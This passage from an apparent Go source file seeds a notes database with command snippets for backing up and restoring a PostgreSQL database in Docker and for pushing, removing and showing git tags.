setting)")
	create(db, "Backup postgresql and restore it in docker\n(tags: backup postgresql docker)\n---\n\npg_dump -h 192.168.0.2 -d mydb -p 5432 -U myuser > /temp/mydb.dump\ndocker cp /temp/mydb.dump my-pg-container:/home/mydb.dump\ndocker exec -it my-pg-container bash\n// dropdb -U postgres 'mydb'\n// psql\n// \\l\n// CREATE DATABASE mydb WITH ENCODING='UTF-8';\n// \\du\n// \\q\n// create role myuser superuser\npsql -U postgres mydb < /home/mydb.dump\n\\\\ \\c\n\\\\ \\dt\n\\\\ select * from pg_catalog.pg_tables;")
	create(db, "Git push tag\n(tags: git tag)\n---\n\n// one tag\ngit push origin v1.0.0\n// many tags\ngit push origin --tags\n// remove tag\ngit push origin :v1.0.0\n// show tag\ngit show v1.0.0")
	//create(db, "")
	//create(db, "")
	//create(db, "")
	//create(db, "")

	//create(db, "")

}
